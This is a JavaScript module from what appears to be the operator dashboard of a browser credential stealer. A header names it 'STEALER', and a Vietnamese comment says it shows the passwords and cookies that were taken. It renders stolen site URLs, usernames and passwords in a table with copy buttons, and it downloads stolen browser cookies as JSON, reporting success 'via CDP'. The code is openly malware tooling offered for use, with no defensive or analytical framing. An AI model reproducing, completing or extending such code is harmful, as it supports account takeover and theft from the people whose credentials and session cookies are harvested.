// =================================================================
// MODULE: STEALER
// Hiển thị mật khẩu và cookies đã lấy được
// =================================================================

import { state } from '../core/state.js';
import { $ } from '../core/utils.js';
import { downloadBase64File } from '../core/utils.js';

export function renderPasswordModal(passwords, browserName) {
    state.currentPasswordData = passwords;
    state.currentBrowserName = browserName;
    
    const passwordTbody = document.getElementById('password-list-body');
    const passwordModal = document.getElementById('password-modal');
    const passwordCountLabel = document.getElementById('pass-count');

    if (!passwordTbody || !passwordModal) return;

    passwordTbody.innerHTML = '';
    passwordCountLabel.innerText = `${passwords.length} items found`;

    passwords.forEach((p, index) => {
        const row = document.createElement('tr');
        const displayUrl = p.url.length > 60 ? p.url.substring(0, 60) + '...' : p.url;
        row.innerHTML = `
        <td><span class="url-cell" title="${p.url}">${displayUrl}</span></td>
        <td><span class="user-cell">${p.user}</span></td>
        <td><span class="pass-cell">${p.pass}</span></td>
        <td class="text-center"><button class="btn-copy" id="btn-copy-${index}" onclick="handleCopy(${index})">Copy</button></td>`;
        passwordTbody.appendChild(row);
    });

    passwordModal.classList.remove('hidden');
    if (typeof feather !== 'undefined') feather.replace();
}

export function handleCookiesResult(msg) {
    if (!msg.data || msg.data.length === 0) {
        alert("No cookies found or decryption failed.");
    } else {
        downloadBase64File(btoa(JSON.stringify(msg.data, null, 2)), `cookies_${msg.browser}_${Date.now()}.json`);
        alert(`Success! Downloaded ${msg.data.length} cookies via CDP.`);
    }
}